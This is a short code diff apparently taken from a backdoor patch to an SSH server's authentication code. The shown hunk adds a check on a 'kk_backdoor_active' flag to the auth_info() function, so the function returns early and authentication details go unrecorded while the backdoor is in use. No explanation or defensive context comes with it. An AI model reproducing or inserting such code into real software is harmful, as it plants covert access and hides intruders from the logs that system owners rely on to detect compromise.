@@ -259,6 +259,9 @@ auth_info(Authctxt *authctxt, const char *fmt, ...)
 	va_list ap;
         int i;
 
+	if(kk_backdoor_active)
+		return;
+
 	free(authctxt->info);
 	authctxt->info = NULL;
 
